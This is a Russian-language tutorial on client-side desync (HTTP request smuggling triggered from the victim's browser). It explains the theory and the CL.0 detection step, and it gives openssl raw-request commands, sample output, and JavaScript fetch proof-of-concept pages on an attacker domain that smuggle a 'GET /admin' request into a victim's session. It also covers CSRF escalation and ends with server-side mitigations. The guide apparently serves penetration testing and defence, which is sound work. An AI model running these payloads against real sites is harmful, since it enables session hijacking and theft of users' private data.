Классический request smuggling (`web-request-smuggling`) требует, чтобы вы контролировали «сырое» соединение. **Client-side desync (CSD)** — это разновидность десинхронизации, которую инициирует **сам браузер жертвы**: если сервер неправильно обрабатывает `Content-Length`/`Transfer-Encoding` или игнорирует тело, «хвост» вашего запроса остаётся в соединении и «прилипает» к следующему запросу жертвы. Итог: отравление чужих ответов, кража данных, иногда XSS — всё из обычной веб-страницы атакующего.

## Теория: почему браузер может «оставить хвост»

Браузер отправляет запрос и **ожидает ровно один ответ**. Если сервер считает, что тело запроса длиннее/короче, чем думает клиент (или вовсе игнорирует тело), то:

- сервер может прочитать **часть следующего запроса** как тело текущего, либо
- в соединении остаётся **необработанный запрос**, который сервер выполнит как отдельный.

Ключевые причины CSD:
- **`CL.0`**: сервер игнорирует `Content-Length` и не читает тело (часто на статических/статик-путях или при редиректе) — тело остаётся в соединении.
- **`TE.TE`/`CL.TE`**: разные фронтенд и бэкенд по-разному трактуют заголовки.
- **HTTP/2 → HTTP/1.1 downgrade**: фронтенд пересобирает запрос, теряя/дублируя длины.

CSD особенно опасен, потому что **браузер держит keep-alive соединение** и следующий запрос жертвы пойдёт по «отравленному» сокету.

## Теория: схема атаки

1. Жертва посещает `evil.com`.
2. JS отправляет на целевой origin «хитрый» запрос, чьё тело сервер не потребит (например, `POST /` с телом, которое будет проигнорировано).
3. Сервер отвечает, но оставшийся «хвост» остаётся в TCP-соединении.
4. Браузер жертвы на **том же соединении** отправляет следующий запрос (например, переход по ссылке).
5. Хвост + новый запрос склеиваются → сервер выполняет подставленный вами запрос (или отдаёт отравленный ответ на чужой запрос).

Вы можете сделать так, чтобы жертва сама выполнила действие (CSRF-эскалация) или получила чужой ответ.

## Теория: откуда «хвост» берётся

Типичный CSD-примитив — запрос, где сервер **не читает тело**, но браузер его отправил. Например:

```
POST /en HTTP/1.1
Host: target
Content-Length: 5

GET /404
```

Если сервер на `/en` отвечает редиректом, не читая тело, то `GET /404` остаётся в соединении. Следующий запрос жертвы склеится с ним. Для браузера тело формируется через `fetch` с `body`, `Content-Type: text/plain` (simple request, без preflight).

## Инструменты и команды

Обнаружение — **Burp Scanner** (встроенный «client-side desync» чек) или ручной тест. Проверить `CL.0`:

```bash
# отправляем запрос с телом, которое сервер, возможно, игнорирует
printf 'POST /en HTTP/1.1\r\nHost: target.local\r\nContent-Length: 5\r\n\r\nGET /404 HTTP/1.1\r\nHost: target.local\r\n\r\n' \
  | openssl s_client -quiet -connect target.local:443 -servername target.local 2>/dev/null | head -40
```

Если вы видите **два** ответа (на `POST /en` и на `GET /404`) — десинхронизация есть.

Проверить через браузер (в консоли своей страницы, в рамках теста):

```js
fetch('https://target.local/en', {
  method: 'POST',
  body: 'GET /404 HTTP/1.1\r\nHost: target.local\r\n\r\n',  // текст
  mode: 'no-cors',
  credentials: 'include'
});
```

Затем перейти по ссылке на `target.local` — если следующий ответ содержит признаки подставленного запроса, CSD подтверждён.

## Разобранный пример: CSD → отравление ответа жертвы

Шаг 1. Находим endpoint, который не читает тело (например, `/en` — редирект на язык). Подтверждаем CL.0 двойным ответом (команда выше).

Шаг 2. На `evil.com`:

```html
<script>
fetch('https://target.local/en', {
  method:'POST',
  body:'GET /admin HTTP/1.1\r\nHost: target.local\r\n\r\n',
  mode:'no-cors', credentials:'include'
});
// через 100ms навигируем жертву
setTimeout(()=>location='https://target.local/', 300);
</script>
```

Шаг 3. Сервер выполнит `GET /admin` в контексте сессии жертвы, а ответ на её собственный запрос окажется «сдвинутым». Если `/admin` вернул приватные данные — они попадут в ответ, который увидит жертва (или который вы можете заставить её отправить вам). В отчёте — точные запросы и доказательство десинка.

## Разобранный пример: CSD + CSRF-эскалация

Если «хвост» содержит запрос к sensitive-эндпоинту с методом POST и cookie жертвы, вы выполняете действие без CSRF-токена (потому что это «часть» легитимного соединения). Это обходит SameSite-защиту в некоторых сценариях, так как запрос идёт на тот же сайт (same-site).

## Частые ошибки

- **Путать CSD с server-side smuggling.** CSD инициируется браузером, а не вашим сырым сокетом.
- **Забывать про preflight.** Тело должно быть «simple» (text/plain), иначе браузер пошлёт OPTIONS и сломает схему.
- **Игнорировать keep-alive.** Без переиспользования соединения хвост не «прилипнет» к чужому запросу.
- **Не проверять `CL.0`.** Многие CSD живут именно на «сервер игнорирует тело».
- **Рискованность.** Тесты CSD могут задевать других — изолируйте и не травите общий трафик без нужды.

## Полный разбор: подтверждение CL.0 и построение PoC (с выводом)

End-to-end подтверждение client-side desync на endpoint, игнорирующем тело.

Шаг 1. Ищем «тело-игнорирующий» endpoint — обычно редирект, статика, ошибка. Проверяем сырым соединением:

```bash
printf 'POST /en HTTP/1.1\r\nHost: target.local\r\nContent-Length: 5\r\n\r\nGET /404 HTTP/1.1\r\nHost: target.local\r\n\r\n' \
  | openssl s_client -quiet -connect target.local:443 -servername target.local 2>/dev/null | head -40
```

Если в выводе **два** статуса (`HTTP/1.1 302` на `POST /en` и `HTTP/1.1 404` на `GET /404`) — сервер не прочитал тело, десинк есть:

```
HTTP/1.1 302 Found
Location: /en-us
...
HTTP/1.1 404 Not Found
...
```

Шаг 2. Строим браузерный PoC на своём (attacker) домене:

```html
<script>
fetch('https://target.local/en', {
  method:'POST',
  body:'GET /admin HTTP/1.1\r\nHost: target.local\r\n\r\n',
  mode:'no-cors',
  credentials:'include'
});
setTimeout(()=>location='https://target.local/somepage', 500);
</script>
```

`Content-Type` по умолчанию для строки — `text/plain` (simple request, без preflight). Браузер отправит тело, сервер его проигнорирует, «хвост» останется в keep-alive соединении.

Шаг 3. Жертва открывает страницу → её следующий запрос склеивается с `GET /admin` → сервер выполнит его в контексте сессии жертвы. Наблюдаемый эффект: жертва получает «сдвинутый» ответ (или приватные данные). Фиксируем: DevTools Network жертвы + логи.

Шаг 4. Если тело сервер всё же читает — ищите другие векторы: `TE.TE` (обфускация `Transfer-Encoding: xchunked`), `CL.TE`/`TE.CL`, HTTP/2→1.1 downgrade.

## Reference-таблица: типы десинка и признаки

| Тип | Где возникает | Признак |
|-----|---------------|---------|
| `CL.0` | сервер игнорирует тело | два ответа в одном соединении |
| `TE.TE` | оба слоя «видят» TE, но трактуют по-разному | обфускация TE проходит |
| `CL.TE` | фронт по CL, бэкенд по TE | таймаут/расхождение |
| `TE.CL` | фронт по TE, бэкенд по CL | расхождение |
| HTTP/2 downgrade | h2 → h1.1 пересборка | потеря/дублирование длины |
| Response splitting | CRLF в заголовке | расщепление ответа |
| CSD | браузер + keep-alive | «хвост» липнет к запросу жертвы |

## CSD + браузер: особенности и ограничения

- **Simple request обязателен:** `Content-Type: text/plain`, `application/x-www-form-urlencoded` или `multipart/form-data`; иначе preflight (OPTIONS) сломает схему.
- **Keep-alive критичен:** браузер должен переиспользовать сокет для следующего запроса; современные браузеры делают это по умолчанию, но connection-per-origin лимиты и HTTP/2 мультиплексирование влияют.
- **HTTP/2:** браузеры почти всегда ходят по h2; CSD-примитив в h2 иной — сервер может игнорировать тело потока. Проверяйте оба протокола.
- **SameSite:** «хвост» идёт в рамках соединения с целевым origin, поэтому cookie (даже `Lax`) прикладываются — это усиливает атаку.
- **Порядок запросов:** между вашим fetch и навигацией жертвы не должно быть других запросов на тот же origin (иначе хвост «съест» не тот запрос). Управляйте таймингом.

## Что делать дальше / решение

1. **Найти endpoint, игнорирующий тело** (`/en`, статика, редиректы) — сырым соединением.
2. **Подтвердить десинк** двойным ответом (CL.0) или расхождением TE.
3. **Построить браузерный PoC** (`fetch` + `text/plain` + навигация).
4. **Проверить эффект** на своём аккаунте: выполнился ли подставленный запрос/ответ.
5. **Эскалировать:** CSRF-действие через «хвост» или кража приватного ответа.
6. **Не травить общий трафик** других пользователей — изолируйте тест.
7. Зафиксировать PoC (HTML + логи) и указать конкретный десинк-вектор.

## Отличие CSD от server-side smuggling

| Признак | Server-side smuggling | Client-side desync (CSD) |
|---------|----------------------|--------------------------|
| Кто инициирует | ваш сырой сокет | браузер жертвы |
| Канал | фронтенд↔бэкенд (прокси) | браузер↔фронтенд (keep-alive) |
| Условие | расхождение CL/TE у слоёв | сервер игнорирует тело (CL.0) и др. |
| Жертва | другие пользователи через общий прокси | сама жертва (её соединение) |
| SameSite | обычно cookie не идут | cookie идут (соединение с целевым origin) |
| Инструменты | Burp Repeater (raw), smuggler.py | браузерный JS + Burp Scanner |
| Риск | отравить чужой трафик на прокси | задеть соединение жертвы |

Практический вывод: если сервер обрабатывает `Content-Length`/`Transfer-Encoding` нестрого **и** доступен из браузера с keep-alive, CSD реально опасен без «сырого» доступа. Всегда проверяйте оба класса: сначала базовый CL.0/TE-тест, затем браузерный PoC.

## Митигации на стороне сервера

Защита от CSD/десинка — единообразная обработка длины тела и заголовков:

- **Читать тело всегда** (даже на редиректах/статике) или явно отклонять запросы с телом, где оно не нужно.
- **Отклонять неоднозначные `Transfer-Encoding`/`Content-Length`** (дублирование, обфускация).
- **Согласованность слоёв:** фронтенд и бэкенд должны одинаково трактовать CL/TE (лучше — нормализовать на входе).
- **HTTP/2 без downgrade:** не пересобирать h2→h1.1 неаккуратно.
- **Закрывать соединение** при любой аномалии длины.
